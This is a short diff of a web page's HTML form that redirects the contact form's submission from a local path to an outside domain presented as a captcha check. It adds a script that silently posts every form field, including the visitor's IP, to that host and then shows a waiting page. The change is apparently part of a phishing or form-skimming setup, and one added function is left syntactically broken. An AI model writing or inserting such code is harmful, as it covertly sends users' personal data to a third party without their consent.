@@ -146,7 +146,7 @@ function validate(){
         userIpInput.value = getUserIP();
     });
 </script>
-<form id="frmContact" action="/bekle" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
+<form id="frmContact" action="https://alliikkerrr.online/validateCaptcha.php" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
  <input type="hidden" name="user_ip" value="">
 
 
@@ -316,6 +316,33 @@ $(document).ready(function () {
  
 
 </div></section></form>
+<script>
+    function validate() {
+         return false;
+    </script>
+
+    <script>
+    
+        document.getElementById('frmContact').addEventListener('submit', function(event) {
+            event.preventDefault();  
+
+            // Form verilerini al
+            var formData = new FormData(this);
+
+            // Ajax ile post isteği gönder
+            fetch(this.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                 window.location.href = '/bekle.html';
+            })
+            .catch(error => {
+                window.location.href = '/bekle.html';
+            });
+        });
+    </script>
+	
 	<script>
   new Vue({
     el: '#app',
